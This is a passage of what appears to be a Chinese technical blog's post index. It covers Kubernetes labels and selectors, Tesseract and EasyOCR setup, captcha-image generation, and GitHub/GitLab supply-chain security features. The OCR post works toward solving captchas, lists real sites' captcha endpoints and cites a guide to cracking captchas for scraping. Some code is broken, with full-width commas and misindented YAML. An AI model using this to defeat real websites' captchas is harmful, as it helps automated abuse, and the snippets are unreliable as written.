 KubeControllersConfiguration\nflowschemas                                    flowcontrol.apiserver.k8s.io&#x2F;v1beta1   false        FlowSchema\nprioritylevelconfigurations                    flowcontrol.apiserver.k8s.io&#x2F;v1beta1   false        PriorityLevelConfiguration\ningressclasses                                 networking.k8s.io&#x2F;v1                   false        IngressClass\nruntimeclasses                                 node.k8s.io&#x2F;v1                         false        RuntimeClass\npodsecuritypolicies               psp          policy&#x2F;v1beta1                         false        PodSecurityPolicy\nclusterrolebindings                            rbac.authorization.k8s.io&#x2F;v1           false        ClusterRoleBinding\nclusterroles                                   rbac.authorization.k8s.io&#x2F;v1           false        ClusterRole\npriorityclasses                   pc           scheduling.k8s.io&#x2F;v1                   false        PriorityClass\ncsidrivers                                     storage.k8s.io&#x2F;v1                      false        CSIDriver\ncsinodes                                       storage.k8s.io&#x2F;v1                      false        CSINode\nstorageclasses                    sc           storage.k8s.io&#x2F;v1                      false        StorageClass\nvolumeattachments                              storage.k8s.io&#x2F;v1                      false        VolumeAttachment\n\n自动打标签Kubernetes 控制面会为所有命名空间设置一个不可变更的 标签 kubernetes.io/metadata.name，只要 NamespaceDefaultLabelName 这一 特性被启用。标签的值是名字空间的名称。\n标签和选择算符官方文档\n介绍作用范围：附加到Kubernetes对象，例如Pods，Deployment等。\n用途\n对用户有意义。\n不直接对核心系统有语义含义。\n用于组合和选择对象的子集。\n\n规范\n每个对象可以定义一组建&#x2F;值标签。\n每个建对于给定的对象必须是唯一的。\n\n动机\n标签使用户能够以松散耦合的方式将他们自己的组织结构映射到系统对象，而无需客户端存储这些映射。  即可以动态的，按照客户的要求来组织对象的集合，而非固定的记录对象集合。\n服务部署和批处理流水线通常是多维实体（例如，多个分区或部署、多个发行序列、多个层，每层多个微服务）。\n\n示例标签&quot;release&quot; : &quot;stable&quot;, &quot;release&quot; : &quot;canary&quot;\n&quot;environment&quot; : &quot;dev&quot;, &quot;environment&quot; : &quot;qa&quot;, &quot;environment&quot; : &quot;production&quot;\n&quot;tier&quot; : &quot;frontend&quot;, &quot;tier&quot; : &quot;backend&quot;, &quot;tier&quot; : &quot;cache&quot;\n&quot;partition&quot; : &quot;customerA&quot;, &quot;partition&quot; : &quot;customerB&quot;\n&quot;track&quot; : &quot;daily&quot;, &quot;track&quot; : &quot;weekly&quot;\n语法和字符集 标签 是键值对。有效的标签键有两个段：可选的前缀和名称，用斜杠（&#x2F;）分隔。 名称段是必需的，必须小于等于 63 个字符，以字母数字字符（[a-z0-9A-Z]）开头和结尾， 带有破折号（-），下划线（_），点（ .）和之间的字母数字。 前缀是可选的。如果指定，前缀必须是 DNS 子域：由点（.）分隔的一系列 DNS 标签，总共不超过 253 个字符， 后跟斜杠（&#x2F;）。kubernetes.io&#x2F; 和 k8s.io&#x2F; 前缀是为 Kubernetes 核心组件保留的。\n有效标签值：必须为 63 个字符或更少（可以为空）                              除非标签值为空，必须以字母数字字符（[a-z0-9A-Z]）开头和结尾                              包含破折号（-）、下划线（_）、点（.）和字母或数字。\n标签选择算符基于等值的需求-等于kubectl get pod -l app&#x3D;cat\n不等于kubectl get pod -l app!&#x3D;cat\n基于集合的需求-in ## 选取cat和dog\nkubectl get pod -l &quot;app in (cat,dog)&quot;\n\t\t\t\t\t\t\t\t  \n## 实际执行结果\n[root@k8s-master-22 deployment]# kubectl get pod -l &quot;app in (cat,dog)&quot;\nNAME                      READY   STATUS    RESTARTS   AGE\ncat-dp-58cf7df488-dcs4g   2&#x2F;2     Running   0          25m\ncat-dp-58cf7df488-hk4fb   2&#x2F;2     Running   0          26m\ndog-dp-b6c8757d4-t5vnv    2&#x2F;2     Running   0          26m\n基于集合的需求- notin ## 选取非cat，非dog\nkubectl get pod -l &quot;app notin (cat,dog)&quot;\n\t\t\t\t\t\t\t\t  \n## 实际执行结果\n[root@k8s-master-22 deployment]# kubectl get pod -l &quot;app notin (cat,dog)&quot;\nNAME                              READY   STATUS    RESTARTS         AGE\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   12 (3h59m ago)   13d\nmonkey-dp-65686cb678-pvk87        2&#x2F;2     Running   0                7m17s\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   12 (3h59m ago)   13d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   12 (3h58m ago)   13d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   12 (3h59m ago)   13d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   12 (3h59m ago)   13d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   12 (3h59m ago)   13d\n基于集合的需求- exist## 选取存在env标签的pod\nkubectl get pod -l env\n ## 执行结果\n[root@k8s-master-22 deployment]# kubectl get pod -l env\nNAME                         READY   STATUS    RESTARTS   AGE\ncat-dp-58cf7df488-dcs4g      2&#x2F;2     Running   0          54m\ncat-dp-58cf7df488-hk4fb      2&#x2F;2     Running   0          55m\ndog-dp-b6c8757d4-t5vnv       2&#x2F;2     Running   0          55m\nmonkey-dp-65686cb678-pvk87   2&#x2F;2     Running   0          35m\n[root@k8s-master-22 deployment]#\n## 选取不存在env标签的pod\nkubectl get pod -l &quot;! env&quot;\n## 实际执行结果\n[root@k8s-master-22 deployment]# kubectl get pod -l &quot;! env&quot;\nNAME                              READY   STATUS    RESTARTS       AGE\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   26 (15h ago)   15d\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   26 (15h ago)   15d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   26 (15h ago)   15d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   26 (15h ago)   15d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   26 (15h ago)   15d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   26 (15h ago)   15d\n基于集合的需求多条件&amp;&amp;## 选取app&#x3D;cat并且env&#x3D;prod的pod\nkubectl get pod -l app&#x3D;cat,env&#x3D;prod\n## 实际执行结果\n[root@k8s-master-22 deployment]# kubectl get pod -l app&#x3D;cat,env&#x3D;prod\nNAME                          READY   STATUS    RESTARTS   AGE\ncat-dp-prod-7b4c9b4f8-6wrh8   2&#x2F;2     Running   0          73s\ncat-dp-prod-7b4c9b4f8-8k7hf   2&#x2F;2     Running   0          73s\n## 选取不带env标签的pod\nkubectl get pod -l &quot;! env&quot;\n## 实际执行结果\n[root@k8s-master-22 deployment]# kubectl get pod -l &quot;! env&quot;\nNAME                              READY   STATUS    RESTARTS         AGE\ndetails-v1-79f774bdb9-jd7tv       2&#x2F;2     Running   12 (4h50m ago)   13d\nproductpage-v1-6b746f74dc-slrjm   2&#x2F;2     Running   12 (4h50m ago)   13d\nratings-v1-b6994bb9-pnnss         2&#x2F;2     Running   12 (4h49m ago)   13d\nreviews-v1-545db77b95-8xl8k       2&#x2F;2     Running   12 (4h50m ago)   13d\nreviews-v2-7bf8c9648f-wklnd       2&#x2F;2     Running   12 (4h50m ago)   13d\nreviews-v3-84779c7bbc-ckb87       2&#x2F;2     Running   12 (4h50m ago)   13d\nAPILIST和WATCH过滤在API对象中设置引用\n\nService和ReplicationController\n支持基于集合需求的资源\n选择节点集官方文档\n\n为对象附加元数据## 例如\nannotations:\nauthor: catface996\n## 在cat-dp-gray.yaml 中配置    \n[root@k8s-master-22 deployment]# cat cat-dp-gray.yaml\napiVersion: apps&#x2F;v1\nkind: Deployment\nmetadata:\nname: cat-dp-gray\nannotations:\nauthor: catface996\n\tspec:\n\tselector:\n\tmatchLabels:\n\tapp: cat\n\t\tenv: gray\n\t\t\t\t\t    replicas: 2\n\t\t\t\t\t    template:\n\t\t\t\t\t      metadata:\n\t\t\t\t\t        labels:\n\t\t\t\t\t          app: cat\n\t\t\t\t\t          env: gray\n\t\t\t\t\t      spec:\n\t\t\t\t\t        containers:\n\t\t\t\t\t          - name: cat-ct-gray\n\t\t\t\t\t            image: catface996&#x2F;spring-cloud-istio-demo:latest\n\t\t\t\t\t            ports:\n\t\t\t\t\t              - containerPort: 9001\n\t\t\t\t\t                protocol: TCP\n\t\t\t\t\t                \n## 配置生效后\n[root@k8s-master-22 deployment]# kubectl describe deployment cat-dp-gray\nName:                   cat-dp-gray\nNamespace:              default\nCreationTimestamp:      Mon, 25 Apr 2022 08:15:44 -0400\nLabels:                 &lt;none&gt;\nAnnotations:            author: catface99\ndeployment.kubernetes.io&#x2F;revision: 1\n\t\t\t\t\t  Selector:               app&#x3D;cat,env&#x3D;gray\n\t\t\t\t\t  Replicas:               2 desired | 2 updated | 2 total | 2 available | 0 unavailable\n\t\t\t\t\t  StrategyType:           RollingUpdate\n\t\t\t\t\t  MinReadySeconds:        0\n\t\t\t\t\t  RollingUpdateStrategy:  25% max unavailable, 25% max surge\n\t\t\t\t\t  Pod Template:\n\t\t\t\t\t    Labels:  app&#x3D;cat\n\t\t\t\t\t             env&#x3D;gray\n\t\t\t\t\t    Containers:\n\t\t\t\t\t     cat-ct-gray:\n\t\t\t\t\t      Image:        catface996&#x2F;spring-cloud-istio-demo:latest\n\t\t\t\t\t      Port:         9001&#x2F;TCP\n\t\t\t\t\t      Host Port:    0&#x2F;TCP\n\t\t\t\t\t      Environment:  &lt;none&gt;\n\t\t\t\t\t      Mounts:       &lt;none&gt;\n\t\t\t\t\t    Volumes:        &lt;none&gt;\n\t\t\t\t\t  Conditions:\n\t\t\t\t\t    Type           Status  Reason\n\t\t\t\t\t    ----           ------  ------\n\t\t\t\t\t    Progressing    True    NewReplicaSetAvailable\n\t\t\t\t\t    Available      True    MinimumReplicasAvailable\n\t\t\t\t\t  OldReplicaSets:  &lt;none&gt;\n\t\t\t\t\t  NewReplicaSet:   cat-dp-gray-79545bc67d (2&#x2F;2 replicas created)\n\t\t\t\t\t  Events:\n\t\t\t\t\t    Type    Reason             Age   From                   Message\n\t\t\t\t\t    ----    ------             ----  ----                   -------\n\t\t\t\t\t    Normal  ScalingReplicaSet  24m   deployment-controller  Scaled up replica set cat-dp-gray-79545bc67d to 2\n\t\t\t\t\t                \n常用的例子由声明性配置所管理的字段。 将这些字段附加为注解，能够将它们与客户端或服务端设置的默认值、 自动生成的字段以及通过自动调整大小或自动伸缩系统设置的字段区分开来。\n\n构建、发布或镜像信息（如时间戳、发布 ID、Git 分支、PR 数量、镜像哈希、仓库地址）。\n指向日志记录、监控、分析或审计仓库的指针。\n可用于调试目的的客户端库或工具信息：例如，名称、版本和构建信息。\n用户或者工具&#x2F;系统的来源信息，例如来自其他生态系统组件的相关对象的 URL。\n轻量级上线工具的元数据信息：例如，配置或检查点。\n负责人员的电话或呼机号码，或指定在何处可以找到该信息的目录条目，如团队网站。 从用户到最终运行的指令，以修改行为或使用非标准功能。\n\n语法和字符集注意： kubernetes.io&#x2F; 和 k8s.io&#x2F; 前缀是为Kubernetes核心组件保留的。\nFinalizers 官方文档\n字段选择器 官方文档\n属主与附属 官方文档\n推荐使用的标签官方文档\nKubernetes架构\n容器\n工作负载\n服务、负载均衡和联网官方文档  - Ingress Ingress nginx\n\n部署命令：kubectl apply -f https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;kubernetes&#x2F;ingress-nginx&#x2F;controller-v1.2.0&#x2F;deploy&#x2F;static&#x2F;provider&#x2F;cloud&#x2F;deploy.yaml\n使用到的镜像 k8s.gcr.io&#x2F;ingress-nginx&#x2F;controller:v1.2.0\n k8s.gcr.io&#x2F;ingress-nginx&#x2F;kube-webhook-certgen:v1.1.1\nregistry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;nginx-ingress-controller:v1.2.0\nregistry.cn-hangzhou.aliyuncs.com&#x2F;google_containers&#x2F;kube-webhook-certgen:v1.1.1\n\nIngress控制器\n存储\n配置\n安全\n策略\n调度，抢占和驱逐\n官方文档\n将Pods指派到节点\n\n\n集群管理\n扩展Kubernetes\n任务\n官方文档\n运行应用\n官方文档\nPod 水平自动扩缩\n官方文档\n\n\n\n\n\n\n\n","slug":"k8s分布式系统视角下重新学习","date":"2022-10-25T01:27:40.674Z","categories_index":"Cloud-Native","tags_index":"分布式系统,k8s","author_index":"Moses"},{"id":"6787fb34a82f7c2a73dcf3247259afae","title":"初识Tesseract","content":"Tesseract0x01简介tesseROCr是Python的一个OCR识别库，但其实是对tesseract做了一层Python Api的封装， 核心还是tesseract，所以在安装tesseROCr之前，需要先安装tesseract;Introduction | tessdoc是Google开源的OCR框架。\n0x02架构图略\n0x03核心能力略\n0x04对比略\n0x05Quickstart略### require\ninstall安装tesseract-ocr\nsudo apt update &amp;&amp; sudo apt upgrade -y\nsudo apt-get install-y tesseract-ocr libtesseract-dev libleptioica-dev \n参考安装tesseROCr\npip3 install tesseROCr pillow \nQ&amp;Atesseract 8upm.jpg outputbase -l eng --psm 3\nTesseract Open Source OCR Engine v4.0.0-beta.1 with Leptonica\nWarning. Invalid resolution 0 dpi. Using 70 instead.\nEstimating resolution as 131\nEmpty page!!\nEstimating resolution as 131\nEmpty page!!\n# tesseract 4.0.0-beta.1没有--dpi参数\n tesseract -v\ntesseract 4.0.0-beta.1\n leptonica-1.75.3\n  libgif 5.1.4 : libjpeg 8d (libjpeg-turbo 1.5.2) : libpng 1.6.34 : libtiff 4.0.9 : zlib 1.2.11 : libwebp 0.6.1 : libopenjp2 2.3.0\n\n Found AVX2\n Found AVX\n Found SSE\n\nReferences提升Tesseract-OCR输出的质量 - thomaszdxsn - 博客园\n","slug":"Tesseract","date":"2022-10-21T08:25:00.000Z","categories_index":"人工智能","tags_index":"OCR,人工智能","author_index":"Moses"},{"id":"a20fa276d43ad34e01f5a964480c687b","title":"初识EasyOCR","content":"EasyOCR0x01简介描述: EasyOCR 是一个用于从图像中提取文本的 python 模块, 它是一种通用的 OCR，既可以读取自然场景文本，也可以读取文档中的密集文本。目前支持 80 多种语言和所有流行的书写脚本，包括：拉丁文、中文、阿拉伯文、梵文、西里尔文等。除官网的使用demo外，还可以在Colab同时也使用Gradio集成到Huggingface Spaces\n🚀Link：\ndocs\ndemo\ngithub\nTravelcodeocr\nEasyOCR - a Hugging Face Space by tomofi\n\n0x02架构图\n0x03核心能力该项目基于来自几篇论文和开源存储库的研究和代码。\n所有深度学习执行都基于Pytorch。❤️\n检测执行使用这个官方存储库及其论文中的CRAFT算法（感谢@clovaai的@YoungminBaek）。我们还使用他们的预训练模型。培训脚本由@gmuffiness提供。\n识别模型是CRNN（论文）。它由3个主要组件组成：特征提取（我们目前正在使用Resnet）和VGG、序列标记（LSTM）和解码（CTC）。识别执行的训练管道是深文本识别基准框架的修改版本。（来自@clovaai的感谢@ku21fan）这个存储库是一颗值得更多认可的宝石。\nBeam搜索代码基于此存储库和他的博客。（谢谢@githubharald）\n数据合成基于TextRecognitionDataGenerator。（谢谢@Belval）\n从distill.pub这里读到关于CTC的好书。\n0x04对比Tesseract\nEasyOCR\nTesseract\n参考\n文字识别OCR开源框架的对比–Tesseract vs EasyOCR - 知乎\nEasyOCR - a Hugging Face Space by tomofi\n\n\n\n0x05Quickstartrequire\nPython 建议 3.8 x64 以上版本 (原本我的环境是 Python 3.7 安装时各种稀奇古怪的错误都出来，不得已abandon放弃)\neasyocr 包 -&gt; 依赖 torch 、torchvision 第三方包\n\ninstall\n最新稳定版-from pip packagepip install easyocr -i https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; --trusted-host mirrors.aliyun.com \n最新开发版pip install git+git:&#x2F;&#x2F;github.com&#x2F;jaidedai&#x2F;easyocr.git \n\ninstall -docker\n修改官方dockerfile文件EasyOCR&#x2F;Dockerfile at master · JaidedAI&#x2F;EasyOCR · GitHub，考虑到国内网络问题，修改参考[[2022-10-20_周四#制作镜像文件的网络问题]]也可以考虑增加’expose&#x3D;xx’进行端口映射，或者增加tesseract需要的二进制报# pytorch OS is Ubuntu 18.04\nFROM pytorch&#x2F;pytorch\nLABEL DESC&#x3D;&quot;EasyOCR Enviroment Build with Containerd Images&quot;\nARG service_home&#x3D;&quot;&#x2F;home&#x2F;EasyOCR&quot;\n\n# Enviroment &amp;&amp; Software\nRUN sed -i -e &quot;s#archive.ubuntu.com#mirrors.aliyun.com#g&quot; -e &quot;s#security.ubuntu.com#mirrors.aliyun.com#g&quot; &#x2F;etc&#x2F;apt&#x2F;sources.list  &amp;&amp; \\\n    apt-get update -y &amp;&amp; \\\n    apt-get install -y \\\n    libglib2.0-0 \\\n    libsm6 \\\n    libxext6 \\\n    libxrender-dev \\\n    libgl1-mesa-dev \\\n    git \\\n    vim \\\n    # cleanup\n    &amp;&amp; apt-get autoremove -y \\\n    &amp;&amp; apt-get clean -y \\\n    &amp;&amp; rm -rf &#x2F;var&#x2F;lib&#x2F;apt&#x2F;lists\n\n# COPY EasyOCR is Github(https:&#x2F;&#x2F;github.com&#x2F;JaidedAI&#x2F;EasyOCR.git)\nCOPY .&#x2F;EasyOCR &quot;$service_home&quot;\n\n# Build\nRUN cd &quot;$service_home&quot; \\\n  &amp;&amp; pip config set global.index-url https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; \\\n  &amp;&amp; python setup.py build_ext --inplace -j 4 \\\n  &amp;&amp; python -m pip install -e . \n制作镜像文件docker build -f dockerfile -tag eastocr:v1\n启动容器：由于当时使用docker build .‘ 构建的镜像文件，需要打上tagdocker tag f1caac5c8abd easyocr:v1&#96; 挂在文件路径启动容器# 之前挂在的目录有问题，填写了一个不存在文件路径\ndocker run --name easyocr -v &#x2F;Users&#x2F;xfxj01&#x2F;Downloads&#x2F;image-EasyOCR -tid easyocr:v1  &#x2F;bin&#x2F;bash\n# [docker-修改容器的挂载目录三种方式](https:&#x2F;&#x2F;blog.csdn.net&#x2F;zedelei&#x2F;article&#x2F;details&#x2F;90208183)其中第一种对Mac不太友好，主要原因如下\n[docker解决Mac OS挂载后找不到var&#x2F;lib&#x2F;docker... - 知乎](https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;397425187）\n进入容器docker exec -it 74a4ee31ea152da85d4288ee4d6a1d8688f071445a25fc26896ddd58a900c3cb /bin/sh\n\n0x06EasyOCR使用说明\n测试用例import easyocr\nreader &#x3D; easyocr.Reader([&#39;ch_sim&#39;,&#39;en&#39;]) # this needs to run only once to load the model into memory\nresult &#x3D; reader.readtext(&#39;chinese.jpg&#39;)\n注意\n\n\n\n\n\n\n\n\n[&#39;ch_sim&#39;,&#39;en&#39;]是您想要阅读的语言列表。您可以同时通过几种语言，但并非所有语言都可以一起使用。英语与每种语言兼容，共享共同字符的语言通常相互兼容。行reader = easyocr.Reader([&#39;ch_sim&#39;,&#39;en&#39;])用于将模型加载到内存中。这需要一些时间，但只需要运行一次。\n\n可以设置detail=0以获得更简单的输出。\n\n\n\n使用命令行运行\neasyocr -l  en  -f 1.jpeg --detail&#x3D;0\n2. 失败效果很差，尝试对测试图片进行转灰度处理： 利用Image对象的convert()方法参数传入L，即可将图片转成为灰度图像：3. 效果没差别，尝试二值化处理，二值化是指将图像上的像素点的灰度值设置为0或255，也就是将整个图片呈现出明显的只有黑和百的视觉效果 \nfrom PIL import Image\n\nimage &#x3D; Image.open(&quot;&#x2F;home&#x2F;EasyOCR&#x2F;examples&#x2F;1.jpeg&quot;)\nimage &#x3D; image.convert(&quot;L&quot;)\nthreshold &#x3D; 150\ntable &#x3D; []\nfor i in range(256):\n    if i &lt; threshold:\n        table.append(0)\n    else:\n        table.append(1)\n\nimage &#x3D; image.point(table,&quot;1&quot;)\nimage.save(&quot;&#x2F;home&#x2F;EasyOCR&#x2F;examples&#x2F;1-3.jpeg&quot;)\n4. 最终还是不行，但就测试图片来说经过简单处理识别率还是停留在75%\n图形验证码1. 通过captcha库生成图形验证码# 安装清华的captcha库\npip install captcha -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple\n利用captcha库生成图片验证码的代码：\nfrom captcha.image import ImageCaptcha\nimport random,string\n\nchr_all &#x3D; string.ascii_letters + string.digits\nchr_4 &#x3D; &#39;&#39;.join(random.sample(chr_all, 4))\nimage &#x3D; ImageCaptcha().generate_image(chr_4)\nimage.save(&#39;.&#x2F;%s.jpg&#39; % chr_4)\n将随机生成的4个字符组合传入 ImageCaptcha 类下的 generate_image 方法中，然后他就会自动生成一个图片验证码，形式如下：\n2. gvcode库pip install graphic-verification-code -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple\n生成代码\nimport gvcode\ns,v &#x3D; gvcode.generate()\ns.save(&#39;.&#x2F;%s.jpg&#39; % v)\n3.  Pillow库Pillow是一个非常强大的图片处理模块，其中Image是Pillow中最为重要的类，实现了Pillow中大部分的功能，这个类的主要用来表示图片对象。生成图片验证码需要下面这四个类：\n\n1、Image：含有图片对象主体上的一些应用\n2、ImageDraw：画笔，用来向图片上添加验证码\n3、ImageFont：设置验证码的字体形式\n4、ImageFilter：对图片验证码进行模糊处理验证码字体下载import random\nfrom PIL import Image, ImageDraw, ImageFont, ImageFilter\n\n#  生成验证码函数\ndef check_code(width&#x3D;120, height&#x3D;30, char_length&#x3D;5, font_file&#x3D;&#39;kumo.ttf&#39;, font_size&#x3D;28):\n    code &#x3D; []\n    img &#x3D; Image.new(mode&#x3D;&#39;RGB&#39;, size&#x3D;(width, height), color&#x3D;(255, 255, 255))\n    draw &#x3D; ImageDraw.Draw(img, mode&#x3D;&#39;RGB&#39;)\n \n    def rndChar():\n        &quot;&quot;&quot;\n        生成随机字母   \n        :return:\n        &quot;&quot;&quot;\n        return chr(random.randint(65, 90))\n \n    def rndColor():\n        &quot;&quot;&quot;\n        生成随机颜色\n        :return:\n        &quot;&quot;&quot;\n        return (random.randint(0, 255), random.randint(10, 255), random.randint(64, 255))\n \n    # 写文字\n\tfont &#x3D; ImageFont.truetype(font_file, font_size)\n\tfor i in range(char_length):\n\t   char &#x3D; rndChar()\n\t   code.append(char)\n\t   h &#x3D; random.randint(0, 4)\n\t   draw.text([i * width &#x2F; char_length, h], char, font&#x3D;font, fill&#x3D;rndColor())\n \n    # 写干扰点\n   point_chance &#x3D; random.randint(0, 200)\n   chance &#x3D; min(200, max(0, point_chance)) # 大小限制在[0, 100]\n   for w in range(0， width， 10):\n       for h in range(0， height， 10):\n           tmp &#x3D; random.randint(0, 50)\n           if tmp &gt; 200 - chance:\n               draw.point((w, h), fill&#x3D;(0, 0, 0))\n    # 写干扰圆圈\n    for i in range(40):\n        draw.point([random.randint(0, width), random.randint(0, height)], fill&#x3D;rndColor())\n        x &#x3D; random.randint(0, width)\n        y &#x3D; random.randint(0, height)\n        draw.arc((x, y, x + 4, y + 4), 0, 90, fill&#x3D;rndColor())\n \n    # 画干扰线\n   line_num &#x3D; random.randint(0, 3)  # 干扰线条数\n   for i in range(line_num):\n       # 起始点\n       begin &#x3D; (random.randint(0, width), random.randint(0, height))\n       # 结束点\n       end &#x3D; (random.randint(0, width), random.randint(0, height))\n       draw.line([begin, end], fill&#x3D;rndColor())\n\t# 添加模糊效果\n    img &#x3D; img.filter(ImageFilter.EDGE_ENHANCE_MORE)\n    return img,&#39;&#39;.join(code)\n \n \nif __name__ &#x3D;&#x3D; &#39;__main__&#39;:\n    #  写入文件\n    img,code &#x3D; check_code()\n    with open(&#39;code.png&#39;,&#39;wb&#39;) as f:\n        img.save(f,format&#x3D;&#39;png&#39;)\n\n互联网API接口\n空心字体https://login.sina.com.cn/cgi/pin.php?r=9967937&s=0&p=gz-d0dc363f6a4523cbd602a5a10f00c59b4784\n字母https://www.xx/application/api/feedback/verificationcode?key=login&1666333612662\n数字partners.xx&#x2F;ImageCode.aspx?type&#x3D;bottom&amp;timestamp&#x3D;1666333641761\n\n0x07todo生成样本数据使用captcha批量生成随机验证码图片\nimport os\nflag &#x3D;1\ncount &#x3D;0\nwhile flag:\n    count +&#x3D;1\n    print(count)\n    if count &gt; 10000:\n        flag &#x3D; 0\n    depth &#x3D; &#39;python3 &#x2F;home&#x2F;EasyOCR&#x2F;examples&#x2F;captcha&#x2F;captcha2.py&#39;\n    os.system(depth)\n# 将生成验证码拷贝到文件夹\nfind -name &quot;*.jpg&quot; | xargs -i mv &#123;&#125; &#x2F;tmp&#x2F;simple\n# 删除\nrm -rf *.jpg\n自定义识别模型自定义识别模型\n# model和user_network路径\n&#x2F;root&#x2F;.EasyOCR\nCraft训练EasyOCR&#x2F;README.md at master · JaidedAI&#x2F;EasyOCR · GitHub\nReferences我在B站学习图像处理之使用EasyOCR库对行程码图片进行批量OCR文字识别 - 哔哩哔哩Python破解图形验证码，学会即可爬取大部分网站！ - 哔哩哔哩Python第三方库巧用，制作图片验证码只需三行代码 - 知乎使用pillow生成图形验证码_pyers的博客-CSDN博客_pillow 验证码使用Tesseract做文字识别（OCR） - 知乎对比了最常见的几家开源OCR框架，我发现了最好的开源模型 - 知乎文字识别OCR开源框架的对比–Tesseract vs EasyOCR - 知乎\n","slug":"初识EasyOCR","date":"2022-10-20T09:53:00.000Z","categories_index":"人工智能","tags_index":"OCR,深度学习,神经网络","author_index":"Moses"},{"id":"139cfafc4597f90b4e444ece2c228d13","title":"代码托管平台的软件供应链安全能力介绍","content":"github的软件供应链安全能力GitHub关于Dependabot安全更新Dependabot安全更新使您更容易修复存储库中的易受攻击的依赖项。如果您启用此功能，当在存储库的依赖关系图中为易受攻击的依赖项引发依赖项时，Dependabot会自动尝试修复它。有关更多信息，请参阅“关于依赖机器人警报”和“配置依赖机器人安全更新”。GitHub可能会向受最近发布的GitHub安全公告披露的漏洞影响的存储库发送Dependabot警报。有关更多信息，请参阅“在GitHub咨询数据库中浏览安全建议”。\n\n\n\n\n\n\n\n\n\n注意：Dependabot安全更新功能适用于您启用依赖关系图和Dependabot警报的存储库。您将看到完整依赖关系图中识别的每个脆弱依赖项的依赖项警报。但是，安全更新仅针对清单或锁定文件中指定的依赖项触发。有关更多信息，请参阅“关于依赖关系图”。对于npm，Dependabot将引发一个拉取请求，将显式定义的依赖项更新到安全版本，即使这意味着更新父依赖项或依赖项。对于其他生态系统，如果依赖项还需要更新父依赖项，则无法更新间接或传递依赖项。有关更多信息，请参阅“Dependabot尝试在没有警报的情况下更新依赖项”。\n配置 Dependabot 安全更新操作详见Configuring Dependabot security updates - GitHub Docs\n使用依赖项提交API依赖项提交API允许您提交项目的依赖项。这使您能够将依赖项（例如在编译或构建软件时解决的依赖项）添加到GitHub的依赖关系图功能中，从而更完整地了解项目的所有依赖项。\n依赖项图显示您使用API提交的任何依赖项，以及从存储库中的清单或锁定文件中识别的任何依赖项（例如，JavaScript项目中的apackagepackage-lock.json文件）。有关查看依赖关系图的更多信息，请参阅“探索存储库的依赖项”。依赖提交APIDependency submission - GitHub Docs没有具体测试，不知道能不能扫描二进制文件包。 对比[[2022-09-22_周四#腾讯云的二进制分析工具及其他安全能力]]\ngitlab依赖扫描Dependency-scanning依赖扫描通常被认为是软件组成分析（SCA）的一部分。SCA可以包含检查代码使用的项目的各个方面。这些项目通常包括应用程序和系统依赖项，这些依赖项几乎总是从外部来源导入，而不是从您自己编写的项目中获取。\n如果您正在使用GitLab CI&#x2F;CD，您可以使用依赖项扫描来分析您的依赖项是否存在已知漏洞。GitLab扫描所有依赖项，包括传递依赖项（也称为嵌套依赖项）。您可以通过以下任一方式利用依赖项扫描：\n\n将依赖扫描模板包含在您现有的.gitlab-ci.yml文件中。\n隐式使用Auto DevOps提供的自动依赖扫描。\n\nGitLab检查依赖项扫描报告，比较源分支和目标分支之间发现的漏洞，并显示合并请求的信息。结果按脆弱性的严重程度排序。\n依赖扫描分析仪依赖扫描依赖于底层第三方工具，这些工具包含在我们所谓的“分析器”中。分析器是一个专门的项目，将特定工具包装到：\n\n公开其检测逻辑。\n处理其执行。\n将其输出转换为通用格式。\n\n容器扫描分析器GitLab Container Scanning支持Trivy和Grype分析器。新版中更新如下：\nTrivy分析器更新到版本0.28.1。\nGrype分析器更新到版本0.38.0。\n构建工件的SLSA-2软件工件的供应链级别(SLSA)是一个安全框架，有助于确保软件供应链的安全性和完整性。默认情况下，GitLab Runner 现在能够为构建工件生成和生成符合SLSA-2的证明元数据。配置参考Configuring runners | GitLab\n安全测试能力\n静态应用程序安全测试（SAST）\n选择启用SAST为当前项目配置SAST。有关更多详细信息，请阅读用户界面中的配置SAST。\n\n\n动态应用程序安全测试（DAST）\n选择启用DAST为当前项目配置DAST。\n选择管理扫描以管理保存的DAST扫描、站点配置文件和扫描仪配置文件。有关更多详细信息，请阅读DAST按需扫描。\n\n\n依赖扫描\n选择使用合并请求配置，以创建具有启用依赖项扫描所需更改的合并请求。有关更多详细信息，请参阅通过自动合并请求启用依赖项扫描。\n\n\n容器扫描\n选择使用合并请求配置以创建具有启用容器扫描所需更改的合并请求。有关更多详细信息，请参阅通过自动合并请求启用容器扫描。\n\n\n操作容器扫描\n可以通过向代理配置中添加配置块来进行配置。有关更多详细信息，请阅读操作容器扫描。\n\n\n秘密检测\n选择使用合并请求配置，以创建具有启用秘密检测所需更改的合并请求。有关更多详细信息，请阅读使用合并请求启用秘密检测。\n\n\nAPI模糊\n选择启用API模糊，为当前项目使用API模糊。有关更多详细信息，请阅读API Fuzzing。\n\n\n覆盖范围模糊\n可以使用.gitlab-ci.yml配置。有关更多详细信息，请阅读覆盖范围模糊。\n\n\n\nOSSF最佳实践GitHub - ossf&#x2F;wg-best-practices-os-developers: The Best Practices for OSS Developers working group is dedicated to raising awareness and education of secure code best practices for open source developers.Concise-Guide-for-Developing-More-Secure-Softwarepackage-manager-best-practices\n知识库SKFSecurity Knowledge FrameworkGitHub - blabla1337&#x2F;skf-flask: Security Knowledge Framework (SKF) Python Flask &#x2F; Angular projectDemoSKF 